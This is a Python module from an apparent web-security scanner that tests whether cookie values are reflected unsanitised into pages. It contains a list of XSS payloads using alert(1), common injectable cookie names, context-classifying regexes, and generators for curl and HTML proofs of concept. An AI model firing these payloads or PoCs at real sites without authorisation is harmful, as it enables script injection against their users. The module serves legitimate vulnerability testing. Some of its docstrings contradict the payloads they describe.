"""Cookie-value reflection XSS detection.

Many web applications read cookie values server-side and render them
into the HTML response without sanitization.  Because cookie values
are fully attacker-controlled (any HTTP client -- including a victim's
browser via ``document.cookie`` -- can set them), reflected cookies
are a reliable XSS vector.  Common patterns:

  * "Welcome back, <user>"      -- ``user`` cookie echoed in greeting
  * Theme switcher               -- ``theme`` cookie injected into a
                                    ``<link>`` href or ``<body class>``
  * Language selector            -- ``lang`` cookie injected into a
                                    ``<html lang>`` or a URL
  * "Last visit: <lastVisit>"   -- analytics / dashboard widgets
  * Preference persistence       -- ``pref`` / ``ui`` / ``mode``
                                    cookies rendered into templates
  * "Display name: <display>"   -- profile widgets

A typical vulnerable snippet::

    // server-side template
    <h1>Welcome back, <?= $_COOKIE['user'] ?></h1>

Setting ``user=<svg onload=alert(1)>`` yields::

    <h1>Welcome back, <svg onload=alert(1)></h1>

Important cookie-transport constraints:

  * **No semicolons (``;``).**  Semicolons terminate a cookie pair.
     Any ``;`` in the value silently truncates the cookie -- the rest
     of the payload never reaches the server.
  * **No spaces (unless percent-encoded).**  Some browsers / servers
     interpret a bare space as the end of the cookie value.  Spaces
     in payloads MUST be percent-encoded (``%20``).
  * **No commas.**  Legacy Netscape behavior treated ``,`` as a
     separator; modern browsers do not, but some proxies still do.
     We avoid commas for safety.
  * **No control characters.**  DQUOTE, backslash, and DEL are
     rejected or escaped by various user agents.

This module:

  1. Produces cookie-safe payloads (no ``;``, no bare spaces, no
     control characters).
  2. Detects whether a marker survived reflection.
  3. Classifies the surrounding context (HTML, attribute, script,
     JS string, comment).
  4. Lists common injectable cookie names.
  5. Builds curl and HTML PoCs.  The HTML PoC uses
     ``document.cookie = "name=value"`` and an ``<iframe>`` to trigger
     the request from the victim's browser (carrying the attacker-set
     cookie to the victim origin).
"""
from __future__ import annotations
import re
import shlex
from urllib.parse import quote


# Common injectable cookie names.  Order roughly by how often we see
# them reflected in real-world apps.
INJECTABLE_COOKIES: list[str] = [
    "theme",
    "lang",
    "user",
    "pref",
    "session",
    "userId",
    "lastVisit",
    "ui",
    "display",
    "mode",
    "username",
    "name",
    "displayName",
    "timezone",
    "country",
    "currency",
    "fontSize",
    "color",
    "layout",
    "filter",
]


# Cookie-safe payloads.  No semicolons, no bare spaces, no commas, no
# control characters.  Each payload contains the literal marker
# ``xssentinel`` so reflection can be detected by string search even
# if the surrounding tag is mangled by an HTML-encoding filter.
#
# We deliberately keep payloads compact: cookie value size limits
# (4096 bytes per cookie in most browsers) are not a concern at this
# scale, but some WAFs flag unusually long cookie values.
COOKIE_PAYLOADS: list[str] = [
    # Plain marker -- test whether ANY of the value lands raw.
    "xssentinel",
    # HTML-context break-outs.  No spaces: ``onload=alert(1)`` works
    # without spaces, and we avoid ``src=x onerror=`` by using the
    # event-handler-only form where possible.
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<svg onload=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<body/onload=alert(1)>",
    "<iframe/src=javascript:alert(1)>",
    # Attribute-context break-outs (close the attribute, fire an event)
    '"><svg/onload=alert(1)>',
    "'><svg/onload=alert(1)>",
    # Script / JS-string context break-outs
    '";alert(1);//',
    "';alert(1);//",
    "</script><svg/onload=alert(1)>",
    # Mixed-case variants for naive lowercase filters
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SVG/ONLOAD=alert(1)>",
    # Template-literal sink
    "`,alert(1),`",
]


# Context-classifier regexes (mirrors header_xss.py / path_xss.py).
_CONTEXT_HTML_TAG_RE = re.compile(
    r"<\w+[^>]*\b\w+\s*=\s*[^>]*xssentinel", re.IGNORECASE,
)
_CONTEXT_ATTR_VALUE_RE = re.compile(
    r"\b\w+\s*=\s*['\"][^'\"]*xssentinel", re.IGNORECASE,
)
_CONTEXT_SCRIPT_BLOCK_RE = re.compile(
    r"<script[^>]*>[^<]*xssentinel", re.IGNORECASE | re.DOTALL,
)
_CONTEXT_JS_STRING_RE = re.compile(
    r"['\"`][^'\"`]{0,200}xssentinel[^'\"`]{0,200}['\"`]", re.DOTALL,
)
_CONTEXT_HTML_COMMENT_RE = re.compile(
    r"<!--[^>]*xssentinel", re.DOTALL,
)
_CONTEXT_TEXT_RE = re.compile(r"xssentinel")


# Default marker token.  Callers SHOULD embed this token in their
# payload so the reflection check is reliable across filter
# transformations (encoding, tag-stripping, etc.).
DEFAULT_MARKER = "xssentinel"


# Characters that must never appear in a cookie value: they either
# terminate the cookie (``;``) or are unreliable across user agents.
# Used by callers to validate / sanitize their own payloads before
# transport.  We expose this as a compiled regex for convenience.
_COOKIE_UNSAFE_RE = re.compile(r"[;\s,\x00-\x1f\x7f\"\\]")


def cookie_payloads() -> list[str]:
    """Return payloads suitable for cookie-value injection.

    These are static attack shapes; the reflection marker is
    caller-supplied (see ``detect_reflection`` / ``analyze_response``),
    not embedded here.  Raw payloads MAY contain characters that are
    unsafe in a Cookie header (spaces, semicolons, commas, quotes) --
    always send them through :func:`_cookie_encode_value` /
    ``build_poc_curl`` / ``build_poc_html``, which percent-encode the
    unsafe characters for transport.
    """
    return list(COOKIE_PAYLOADS)


def candidate_cookies() -> list[str]:
    """Return the list of common injectable cookie names."""
    return list(INJECTABLE_COOKIES)


def detect_reflection(response_text: str | None, marker: str) -> bool:
    """Return True if ``marker`` appears verbatim in ``response_text``.

    Treats ``None`` / empty inputs as no reflection.
    """
    if not response_text or not marker:
        return False
    return marker in response_text


def analyze_response(
    response_text: str | None,
    marker: str,
) -> dict:
    """Classify the reflection context of ``marker`` in the response.

    Returns::

        {
            "reflected": bool,        # marker present at all
            "context":   str,         # one of:
                                      #   "html_tag"   -- inside a tag
                                      #   "attribute"  -- inside an attr value
                                      #   "script"     -- inside <script>
                                      #   "js_string"  -- inside a JS string
                                      #   "comment"    -- inside an HTML comment
                                      #   "text"       -- raw HTML text
                                      #   "none"       -- not reflected
            "marker":    str,         # echo of the marker arg
        }
    """
    if not response_text or not marker:
        return {
            "reflected": False,
            "context": "none",
            "marker": marker or "",
        }
    reflected = marker in response_text
    if not reflected:
        ctx = "none"
    elif _CONTEXT_SCRIPT_BLOCK_RE.search(response_text):
        ctx = "script"
    elif _CONTEXT_HTML_COMMENT_RE.search(response_text):
        ctx = "comment"
    elif _CONTEXT_ATTR_VALUE_RE.search(response_text):
        ctx = "attribute"
    elif _CONTEXT_HTML_TAG_RE.search(response_text):
        ctx = "html_tag"
    elif _CONTEXT_JS_STRING_RE.search(response_text):
        ctx = "js_string"
    elif _CONTEXT_TEXT_RE.search(response_text):
        ctx = "text"
    else:
        ctx = "text"
    return {
        "reflected": reflected,
        "context": ctx,
        "marker": marker,
    }


def _cookie_encode_value(value: str) -> str:
    """Percent-encode characters unsafe in a cookie value.

    Encodes ``;``, whitespace, ``,``, control chars, ``"``, and ``\\``
    so the payload survives transport in a ``Cookie:`` header without
    truncation.  Leaves HTML metacharacters (``<``, ``>``, ``'``)
    intact -- the server is expected to receive them raw.
    """
    if not value:
        return ""
    # quote() with safe="<>'+" preserves the characters browsers
    # accept verbatim in cookie values while encoding everything that
    # is unsafe.
    return quote(value, safe="<>'+!()*-./:@^_`|~")


def build_poc_curl(url: str, cookie_name: str, payload: str) -> str:
    """Build a curl command that sends ``payload`` in ``cookie_name``.

    The cookie value is percent-encoded for unsafe characters so the
    payload cannot accidentally terminate the cookie or split the
    ``Cookie:`` header.  The whole header is then shell-quoted.
    """
    if not url or not cookie_name:
        return ""
    payload = payload or ""
    encoded_value = _cookie_encode_value(payload)
    cookie_header = f"{cookie_name}={encoded_value}"
    url_q = shlex.quote(url)
    header_q = shlex.quote(f"Cookie: {cookie_header}")
    return f"curl -i {url_q} -H {header_q}"


def build_poc_html(
    url: str,
    cookie_name: str,
    payload: str,
) -> str:
    """Build an HTML PoC that sets the cookie and loads the target.

    The PoC sets the cookie via ``document.cookie = "name=value"`` and
    then loads the target URL in a hidden ``<iframe>``.  Because the
    cookie is set with no ``Domain`` / ``Path`` attribute, it is scoped
    to the PoC's own origin -- so the iframe MUST be served from the
    same origin as the target.  For cross-origin testing, the auditor
    should use the curl PoC instead.

    The cookie value is percent-encoded for unsafe characters before
    being assigned, matching what ``build_poc_curl`` sends.

    A visible "open in new tab" link is also rendered so the auditor
    can trigger the request manually if the iframe is blocked by
    ``X-Frame-Options`` / CSP ``frame-ancestors``.
    """
    if not url or not cookie_name:
        return ""
    payload = payload or ""
    encoded_value = _cookie_encode_value(payload)
    # JS-string-escape the cookie pair for embedding in the JS literal.
    cookie_pair = f"{cookie_name}={encoded_value}"
    js_cookie = cookie_pair.replace("\\", "\\\\").replace("'", "\\'")
    # HTML-attribute-escape the URL for the iframe src / link href.
    safe_url = (
        url.replace("&", "&amp;")
        .replace('"', "&quot;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
    )
    return (
        "<!DOCTYPE html>\n"
        "<html>\n"
        "<head>\n"
        '  <meta charset="utf-8">\n'
        "  <title>XSSentinel cookie XSS PoC</title>\n"
        "  <style>\n"
        "    body{font:14px/1.4 monospace;background:#111;color:#eee;"
        "padding:24px}\n"
        "    pre{background:#000;color:#0f0;padding:12px;"
        "border:1px solid #333;white-space:pre-wrap}\n"
        "    iframe{width:100%;height:300px;border:1px solid #444;"
        "background:#fff}\n"
        "    a{color:#6cf}\n"
        "  </style>\n"
        "</head>\n"
        "<body>\n"
        "  <h1>XSSentinel &mdash; Cookie XSS PoC</h1>\n"
        f"  <p>Setting cookie <code>{cookie_name}</code> on this origin\n"
        f"   and loading <code>{url}</code> in an iframe.</p>\n"
        "  <p>If the iframe is blocked (XFO / CSP frame-ancestors),\n"
        "   click the link below to open the target in a new tab --\n"
        "   the cookie is already set on this origin.</p>\n"
        f'  <p><a href="{safe_url}" target="_blank">open {url}</a></p>\n'
        '  <iframe id="tgt" src="about:blank"></iframe>\n'
        "  <pre id=\"dbg\">[setup...]</pre>\n"
        "  <script>\n"
        "    (function () {\n"
        "      var dbg = document.getElementById('dbg');\n"
        f"      var cookiePair = '{js_cookie}';\n"
        "      try {\n"
        "        document.cookie = cookiePair + '; path=/';\n"
        "        dbg.textContent = '[cookie set] ' + cookiePair + '\\n'\n"
        "          + '[document.cookie] ' + document.cookie;\n"
        "      } catch (e) {\n"
        "        dbg.textContent = '[cookie set failed] ' + e;\n"
        "        return;\n"
        "      }\n"
        "      // Defer the iframe load so the cookie is committed.\n"
        "      setTimeout(function () {\n"
        f"        document.getElementById('tgt').src = '{safe_url}';\n"
        "      }, 100);\n"
        "    })();\n"
        "  </script>\n"
        "</body>\n"
        "</html>\n"
    )
